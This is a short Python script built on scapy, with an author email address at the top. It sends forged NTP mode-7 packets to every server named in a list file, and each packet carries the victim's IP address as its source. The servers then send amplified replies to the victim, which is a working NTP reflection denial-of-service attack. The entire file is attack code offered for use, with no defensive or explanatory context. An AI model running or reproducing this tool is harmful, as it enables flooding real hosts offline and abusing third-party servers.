#!python
#!/usr/bin/env python
# author: pangzi.me@gmail.com

import sys
from scapy.all import *

def attack(target, ntp_server):
    send(IP(dst=ntp_server, src=target)/(UDP(sport=52816)/NTP(version=2, mode=7, stratum=0, poll=3, precision=42)))

if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(1)

    target = sys.argv[1]
    ntp_server_file = sys.argv[2]
    for ntp_server in open(ntp_server_file, "r"):
        ntp_server = ntp_server.strip()
        if ntp_server != "":
            attack(target, ntp_server)